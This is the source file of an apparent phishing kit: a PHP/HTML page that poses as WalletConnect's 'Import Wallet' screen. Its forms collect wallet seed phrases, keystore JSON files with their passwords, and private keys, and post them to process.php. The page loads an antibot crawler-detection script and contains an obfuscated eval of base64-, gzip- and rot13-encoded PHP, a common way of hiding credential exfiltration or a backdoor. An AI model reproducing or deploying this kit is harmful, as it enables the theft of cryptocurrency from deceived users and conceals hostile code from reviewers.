<html>
<meta http-equiv="content-type" content="text/html" />
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="./files/walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="key" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="pass" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="key" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
  </body>
</html>








<script src="./files/jquery.min.js.download"></script>

    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

